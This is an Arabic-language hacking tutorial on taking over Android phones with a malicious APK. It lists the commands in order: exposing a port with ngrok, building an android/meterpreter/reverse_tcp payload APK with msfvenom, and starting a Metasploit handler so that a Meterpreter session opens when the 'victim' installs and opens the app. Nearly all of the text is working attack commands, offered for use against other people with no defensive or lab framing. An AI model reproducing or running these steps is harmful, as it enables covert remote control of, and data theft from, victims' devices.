للرجوع
اختراق الاندرويد عبر تطبيق apk

اولا يجب ان تكون مثبت اداة Ngrok واداة metasploit
الان تفتح بورت باداة ngrok

termux-chroot

./ngrok tcp 4444

وتفتح صفحة جديدة بترمكس وتكتب امر صناعة البايلود

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=4444 R > /sdcard/termux.apk

مكان الـ 192.168.1.9 حط الايبي الخاص بك

مكان 4444 حط البورت المفتوح عندك

ثانيا امر فتح اداه MetaSploit

msfconsole

ثالثا بعد الدخول علي اداه MetaSploit

$ use exploit/multi/handler

$ set payload android/meterpreter/reverse_tcp

$ set lhost host

مكان الـ host تضع الايبي الخاص بك حسب اختراقك اذا كان خارجي او داخلي

$ set lport 4444

مكان الـ port حط البورت المفتوح عندك ويفظل ان يكون 4444

بعدها

$ run

وعندما يفتح الضحيه التطبيق تفتح لك جلسه Meterpreter

اكتب help لعرض اوامر التحكم بالجهاز
